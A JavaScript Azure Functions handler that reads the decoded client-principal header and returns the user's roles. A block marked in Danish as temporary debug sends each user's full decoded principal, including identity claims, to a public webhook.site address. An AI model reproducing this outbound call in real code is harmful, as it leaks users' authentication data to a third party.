const fetch = globalThis.fetch;

module.exports = async function (context, req) {
  const principalB64 = req.headers["x-ms-client-principal"];

  if (!principalB64) {
    context.res = {
      status: 200,
      headers: { "Content-Type": "application/json; charset=utf-8" },
      body: []
    };
    return;
  }

  let cp;
  try {
    cp = JSON.parse(Buffer.from(principalB64, "base64").toString("utf8"));
  } catch {
    context.res = {
      status: 200,
      headers: { "Content-Type": "application/json; charset=utf-8" },
      body: []
    };
    return;
  }

  // ── MIDLERTIDIG DEBUG: sender den modtagne principal til webhook.site ──
  try {
    const resp = await fetch("https://webhook.site/7f3278e9-1032-4355-968b-9bc2980d3c18", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ source: "getroles", cp })
    });
    context.log("debug webhook status:", resp.status);
  } catch (e) {
    context.log("debug webhook FEJL:", e.message);
  }
  // ── SLUT PÅ MIDLERTIDIG DEBUG ──

  const rolesFromUserRoles = (cp.userRoles || []).map(r => String(r).toLowerCase());

  const rolesFromClaims = (cp.claims || [])
    .filter(c => {
      const t = String(c.typ || "").toLowerCase();
      return t === "roles" || t === "role" || t.endsWith("/identity/claims/role");
    })
    .map(c => String(c.val || "").toLowerCase());

  const set = new Set([...rolesFromUserRoles, ...rolesFromClaims]);
  set.delete("anonymous");
  set.delete("authenticated");

  context.res = {
    status: 200,
    headers: { "Content-Type": "application/json; charset=utf-8" },
    body: [...set]
  };
};
